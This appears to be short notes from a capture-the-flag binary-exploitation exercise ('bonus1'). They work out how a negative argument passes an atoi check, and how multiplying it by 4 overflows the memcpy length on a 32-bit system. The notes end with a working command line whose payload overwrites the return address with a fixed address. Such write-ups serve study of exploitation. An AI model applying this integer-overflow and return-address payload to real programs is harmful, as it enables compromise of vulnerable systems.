
overflow size_t in memcpy, possible because we are on 32 bits system

max int on 32 bits: [2147483647 - 2147483648]
max size_t on 32 bits: [0 - 4294967295]

=> We need a number < 10 with atoi 

=> We can overflow the memcpy -> we are on 32 bits system  

-> max size_t / 4 = (4294967295 / 4) = 1073741823.75 => 
-> (-1073741822 * 4) % 4294967295 = we can write 8 bytes
-> (-1073741809 * 4) % 4294967295 = we can write 60 bytes

=> fuzzing ret addr main-> "AAAA"*14 + "BBBB"  (payload length: 60)

./bonus1 -1073741809 `python  -c 'print "AABB"*14 + "\x82\x84\x04\x08"'`
